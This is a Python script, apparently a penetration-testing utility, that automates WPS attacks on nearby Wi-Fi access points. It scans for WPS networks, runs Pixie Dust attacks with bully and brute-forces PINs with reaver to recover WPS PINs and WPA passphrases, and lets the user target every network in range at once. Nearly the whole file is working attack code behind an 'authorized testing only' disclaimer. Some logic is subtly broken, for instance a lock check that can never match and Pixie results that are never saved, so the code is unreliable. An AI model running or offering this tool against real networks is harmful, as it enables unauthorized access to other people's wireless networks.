#!/usr/bin/env python3
"""
WPS PIN Auditor — Automated WPS PIN Testing Tool
For authorized penetration testing only.

Dependencies (Kali Linux / pentest distros):
    apt install reaver bully pixiewps aircrack-ng

Usage:
    python3 wps_pin_auditor.py [options]
"""

import argparse
import subprocess
import sys
import os
import time
import re
import signal
import json
from datetime import datetime
from pathlib import Path

# ──────────────────────────────────────────────
# Configuration
# ──────────────────────────────────────────────
DEFAULT_INTERFACE = "wlan0"
DEFAULT_TIMEOUT = 120           # seconds per PIN attempt
PIXIE_ATTEMPTS = 3              # max pixie attempts per network
REAVER_PIN_ATTEMPTS = 10        # PINs to try before giving up (0 = infinite)
OUTPUT_DIR = Path.home() / "wps_audit_results"

# Color codes
R = "\033[91m"
G = "\033[92m"
Y = "\033[93m"
B = "\033[94m"
C = "\033[96m"
W = "\033[97m"
N = "\033[0m"
BOLD = "\033[1m"

# ──────────────────────────────────────────────
# Utility functions
# ──────────────────────────────────────────────
def banner():
    print(f"""{C}
  ╔═══════════════════════════════════════════╗
  ║       WPS PIN Auditor v1.0               ║
  ║   For authorized security testing only   ║
  ╚═══════════════════════════════════════════╝{N}
    """)

def run_cmd(cmd, timeout=60, check=True):
    """Run a shell command and return output."""
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=timeout
        )
        if check and result.returncode != 0:
            print(f"{R}[!] Command failed: {cmd}{N}")
            print(f"{R}    {result.stderr.strip()}{N}")
            return None
        return result.stdout.strip()
    except subprocess.TimeoutExpired:
        print(f"{Y}[!] Command timed out: {cmd}{N}")
        return None
    except FileNotFoundError:
        print(f"{R}[!] Required tool not found. Install dependencies:{N}")
        print(f"{Y}    apt install reaver bully pixiewps aircrack-ng{N}")
        return None

def check_root():
    """Ensure script is run as root (required for wireless tools)."""
    if os.geteuid() != 0:
        print(f"{R}[!] This script must be run as root.{N}")
        print(f"{Y}    sudo python3 {sys.argv[0]}{N}")
        sys.exit(1)

def check_dependencies():
    """Verify required tools are installed."""
    tools = ["wash", "reaver", "bully", "pixiewps", "airmon-ng"]
    missing = []
    for t in tools:
        if run_cmd(f"which {t}", timeout=5, check=False) is None:
            missing.append(t)
    if missing:
        print(f"{Y}[*] Missing tools: {', '.join(missing)}{N}")
        print(f"{Y}    Install: apt install reaver bully pixiewps aircrack-ng{N}")
        return False
    return True

def enable_monitor_mode(iface):
    """Enable monitor mode on the wireless interface."""
    print(f"{B}[*] Enabling monitor mode on {iface}...{N}")
    run_cmd(f"airmon-ng check kill", timeout=10, check=False)
    result = run_cmd(f"airmon-ng start {iface}", timeout=15)
    if result is None:
        # Try alternative naming
        mon_iface = f"{iface}mon"
        if run_cmd(f"iwconfig {mon_iface}", timeout=5, check=False):
            return mon_iface
        return None
    # Determine monitor interface name
    mon_match = re.search(r'\(monitor mode enabled on (\S+)\)', result)
    if mon_match:
        return mon_match.group(1)
    # Try common monitor names
    for candidate in [f"{iface}mon", f"mon0"]:
        if run_cmd(f"iwconfig {candidate}", timeout=5, check=False):
            return candidate
    return iface

def disable_monitor_mode(iface):
    """Disable monitor mode."""
    print(f"{B}[*] Disabling monitor mode...{N}")
    run_cmd(f"airmon-ng stop {iface}", timeout=10, check=False)
    run_cmd("service NetworkManager restart", timeout=10, check=False)

# ──────────────────────────────────────────────
# Scanning
# ──────────────────────────────────────────────
def scan_wps_networks(mon_iface, scan_time=30):
    """
    Scan for WPS-enabled networks using wash.
    Returns list of dicts: {bssid, channel, ssid, wps_version, locked, manufacturer}
    """
    print(f"{B}[*] Scanning for WPS-enabled networks (scantime={scan_time}s)...{N}")
    print(f"{Y}    Press Ctrl+C to stop early{N}\n")

    output = run_cmd(
        f"wash -i {mon_iface} -o /tmp/wash_scan.txt -C 2>&1",
        timeout=scan_time + 15
    )

    if not output:
        # Try reading from file or parse command output
        print(f"{Y}[!] No WPS networks found via wash.{N}")
        return []

    networks = []
    lines = output.split('\n')
    # Parse wash output
    for line in lines[2:]:  # skip header lines
        line = line.strip()
        if not line or line.startswith('---'):
            continue
        parts = re.split(r'\s{2,}', line)
        if len(parts) >= 5:
            bssid = parts[0].strip()
            channel = parts[1].strip()
            wps_ver = parts[2].strip() if len(parts) > 2 else '?'
            locked = parts[3].strip() if len(parts) > 3 else '?'
            ssid = parts[4].strip() if len(parts) > 4 else '?'
            networks.append({
                'bssid': bssid,
                'channel': channel,
                'ssid': ssid,
                'wps_version': wps_ver,
                'locked': locked,
                'manufacturer': ''
            })

    if not networks:
        # Try reading from the file
        try:
            with open('/tmp/wash_scan.txt') as f:
                content = f.read()
            for line in content.split('\n')[2:]:
                line = line.strip()
                if not line or line.startswith('---'):
                    continue
                parts = re.split(r'\s{2,}', line)
                if len(parts) >= 5:
                    networks.append({
                        'bssid': parts[0].strip(),
                        'channel': parts[1].strip(),
                        'ssid': parts[4].strip() if len(parts) > 4 else '?',
                        'wps_version': parts[2].strip() if len(parts) > 2 else '?',
                        'locked': parts[3].strip() if len(parts) > 3 else '?',
                        'manufacturer': ''
                    })
        except FileNotFoundError:
            pass

    return networks

# ──────────────────────────────────────────────
# WPS Attacks
# ──────────────────────────────────────────────
def pixie_attack(mon_iface, bssid, channel, ssid="", timeout=DEFAULT_TIMEOUT):
    """
    Perform PixieWPS attack (exploits WPS PIN computation in some chipsets).
    Returns: (success_bool, pin_or_error)
    """
    print(f"\n{C}═══ PixieWPS Attack on {bssid} ({ssid}) ═══{N}")
    print(f"{Y}[*] This exploits CVE-2014-4979 - works on some routers{N}")

    # First, use bully with pixie option
    pin = None
    for attempt in range(1, PIXIE_ATTEMPTS + 1):
        print(f"{B}[*] Pixie attempt {attempt}/{PIXIE_ATTEMPTS}...{N}")

        # Kill any existing wpa_supplicant sessions on this iface
        run_cmd(f"pkill -f 'reaver.*{mon_iface}'", timeout=5, check=False)
        run_cmd(f"pkill -f 'bully.*{mon_iface}'", timeout=5, check=False)
        time.sleep(1)

        # Try bully with --pixie option
        cmd = (
            f"timeout {timeout} bully {mon_iface} "
            f"-b {bssid} -c {channel} "
            f"--pixie -d 1 -S -F --force "
            f"-o /tmp/wps_pin_{bssid.replace(':','')}.txt 2>&1"
        )
        result = run_cmd(cmd, timeout=timeout + 15, check=False)

        if result is None:
            print(f"{Y}[!] Pixie attack interrupted or failed.{N}")
            continue

        # Parse for PIN
        pin_match = re.search(r'Pin is (\d{8})', result)
        if pin_match:
            pin = pin_match.group(1)
            print(f"{G}[+] WPS PIN found via Pixie: {pin}{N}")
            return True, pin

        pin_match = re.search(r'pixie.*pin[:\s]*(\d{8})', result, re.IGNORECASE)
        if pin_match:
            pin = pin_match.group(1)
            print(f"{G}[+] WPS PIN found via Pixie: {pin}{N}")
            return True, pin

        # Check if router not vulnerable
        if "pixiewps is not supported" in result.lower():
            print(f"{Y}[!] Router does not support pixie attack.{N}")
            return False, "Pixie not supported"

        print(f"{Y}[-] No PIN on attempt {attempt}{N}")
        time.sleep(2)

    return False, "No PIN found via Pixie"

def reaver_pin_attack(mon_iface, bssid, channel, ssid="", timeout=DEFAULT_TIMEOUT, pin=""):
    """
    Use reaver to attempt WPS PIN authentication.
    If pin is provided, try that specific PIN; otherwise brute-force.
    """
    print(f"\n{C}═══ Reaver PIN Attack on {bssid} ({ssid}) ═══{N}")

    # Kill any existing sessions
    run_cmd(f"pkill -f 'reaver.*{mon_iface}'", timeout=5, check=False)
    time.sleep(1)

    # Build command
    cmd = (
        f"reaver -i {mon_iface} -b {bssid} -c {channel} "
        f"-d 2 -vv -S -N -F -T 2 -r 2:15 "
        f"-o /tmp/reaver_{bssid.replace(':','')}.txt "
    )
    if pin:
        cmd += f"-p {pin} "
    else:
        cmd += f"-L -l {REAVER_PIN_ATTEMPTS} " if REAVER_PIN_ATTEMPTS > 0 else ""

    cmd += "2>&1"

    print(f"{B}[*] Starting reaver (timeout={timeout}s)...{N}")
    if pin:
        print(f"{B}[*] Testing PIN: {pin}{N}")
    else:
        print(f"{Y}[*] Brute-force mode (tries up to {REAVER_PIN_ATTEMPTS} PINs){N}")

    result = run_cmd(cmd, timeout=timeout + 15, check=False)

    if result is None:
        return False, "Attack failed"

    # Parse results
    success_match = re.search(r'\[+\]\s*WPS PIN:\s*(\d{8})', result)
    if success_match:
        found_pin = success_match.group(1)
        print(f"{G}[+] WPS PIN found: {found_pin}{N}")

        # Extract PSK if available
        psk_match = re.search(r'\[+\]\s*WPA PSK:\s*"([^"]+)"', result)
        if psk_match:
            print(f"{G}[+] WPA PSK: {psk_match.group(1)}{N}")
        return True, found_pin

    success_match = re.search(r'Pin\s+is\s+(\d{8})', result)
    if success_match:
        found_pin = success_match.group(1)
        print(f"{G}[+] WPS PIN found: {found_pin}{N}")
        return True, found_pin

    # Check if locked
    if "WPS lock" in result.lower() or "lock" in result.lower():
        print(f"{R}[!] WPS is locked on this AP!{N}")
        return False, "WPS locked"

    print(f"{Y}[-] No PIN found within attempts timeout.{N}")
    return False, "No PIN found"

# ──────────────────────────────────────────────
# Main workflow
# ──────────────────────────────────────────────
def main():
    banner()
    check_root()

    parser = argparse.ArgumentParser(
        description="WPS PIN Auditor - For authorized testing only",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument("-i", "--interface", default=DEFAULT_INTERFACE,
                        help=f"Wireless interface (default: {DEFAULT_INTERFACE})")
    parser.add_argument("-t", "--time", type=int, default=30,
                        help="Scan time in seconds (default: 30)")
    parser.add_argument("-b", "--bssid", help="Target BSSID (skips scan)")
    parser.add_argument("-c", "--channel", help="Target channel (required with --bssid)")
    parser.add_argument("--pixie", action="store_true",
                        help="Run PixieWPS attack only")
    parser.add_argument("--reaver", action="store_true",
                        help="Run Reaver PIN attack only")
    parser.add_argument("--pin", help="Specific PIN to test")
    parser.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT,
                        help=f"Timeout per attack in seconds (default: {DEFAULT_TIMEOUT})")

    args = parser.parse_args()

    if not check_dependencies():
        sys.exit(1)

    # Monitor mode
    mon_iface = enable_monitor_mode(args.interface)
    if not mon_iface:
        print(f"{R}[!] Failed to enable monitor mode.{N}")
        sys.exit(1)
    print(f"{G}[+] Monitor mode enabled on {mon_iface}{N}")

    # Ensure output dir
    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
    results = []
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

    try:
        # Target selection
        if args.bssid:
            targets = [{
                'bssid': args.bssid,
                'channel': args.channel or '1',
                'ssid': 'manual_target'
            }]
        else:
            print(f"\n{B}[*] Scanning for targets...{N}")
            targets = scan_wps_networks(mon_iface, scan_time=args.time)

            if not targets:
                print(f"{Y}[!] No WPS-enabled networks found.{N}")
                return

            print(f"\n{G}[+] Found {len(targets)} WPS network(s):{N}")
            print(f"{'─' * 70}")
            for i, net in enumerate(targets, 1):
                lock_icon = f"{R}🔒{N}" if 'L' in net.get('locked', '') or 'Yes' in net.get('locked', '') else f"{G}✓{N}"
                print(f"  {i}. {net['ssid']:<25} {net['bssid']:>17}  Ch:{net['channel']:<4} "
                      f"WPS:{net.get('wps_version','?'):>5}  Locked:{lock_icon}")
            print(f"{'─' * 70}")

            # Interactive selection
            selection = input(f"\n{B}[?] Select target (1-{len(targets)}, 'all' for all): {N}").strip()
            if selection.lower() == 'all':
                pass  # keep all targets
            else:
                try:
                    idx = int(selection) - 1
                    if 0 <= idx < len(targets):
                        targets = [targets[idx]]
                    else:
                        print(f"{R}[!] Invalid selection.{N}")
                        return
                except ValueError:
                    print(f"{R}[!] Invalid input.{N}")
                    return

        # Attack loop
        for target in targets:
            bssid = target['bssid']
            channel = target['channel']
            ssid = target.get('ssid', 'unknown')

            print(f"\n{B}{'=' * 60}{N}")
            print(f"{B}[*] Attacking: {ssid} ({bssid}) on channel {channel}{N}")
            print(f"{B}{'=' * 60}{N}")

            # Set channel
            run_cmd(f"iwconfig {mon_iface} channel {channel}", timeout=5, check=False)

            result_entry = {
                'bssid': bssid,
                'channel': channel,
                'ssid': ssid,
                'timestamp': timestamp,
                'pixie_result': None,
                'reaver_result': None,
                'pin': None,
                'psk': None
            }

            # Pixie attack
            run_pixie = args.pixie or (not args.reaver)
            if run_pixie:
                success, pixie_info = pixie_attack(mon_iface, bssid, channel, ssid, args.timeout)
                result_entry['pixie_result'] = pixie_info
                if success and len(pixie_info) == 8:
                    result_entry['pin'] = pixie_info
                    print(f"{G}[✔] PIN from Pixie: {pixie_info}{N}")

                    # Now try to get PSK with the PIN
                    success2, pin2 = reaver_pin_attack(
                        mon_iface, bssid, channel, ssid, args.timeout, pin=pixie_info
                    )
                    # If we got the PIN back but no PSK, that's okay
                    continue

            # Reaver attack
            run_reaver = args.reaver or (not args.pixie)
            if run_reaver and not result_entry['pin']:
                pin_arg = args.pin if args.pin else None
                success3, reaver_info = reaver_pin_attack(
                    mon_iface, bssid, channel, ssid, args.timeout, pin=pin_arg
                )
                result_entry['reaver_result'] = reaver_info
                if success3:
                    result_entry['pin'] = reaver_info

            results.append(result_entry)

        # Summary
        print(f"\n{G}{'═' * 60}{N}")
        print(f"{G}  AUDIT COMPLETE - SUMMARY:{N}")
        print(f"{G}{'═' * 60}{N}")
        for r in results:
            status = f"{G}✔ PIN: {r['pin']}{N}" if r['pin'] else f"{R}✘ No PIN{N}"
            print(f"  {r['ssid']:<25} {r['bssid']}  ->  {status}")
        print()

        # Save results
        report_file = OUTPUT_DIR / f"wps_audit_{timestamp}.json"
        with open(report_file, 'w') as f:
            json.dump(results, f, indent=2)
        print(f"{B}[*] Results saved to: {report_file}{N}")

    except KeyboardInterrupt:
        print(f"\n{Y}[!] Interrupted by user.{N}")
    finally:
        disable_monitor_mode(mon_iface)
        run_cmd("service NetworkManager restart", timeout=10, check=False)
        print(f"{G}[+] Cleanup complete.{N}")

if __name__ == "__main__":
    main()
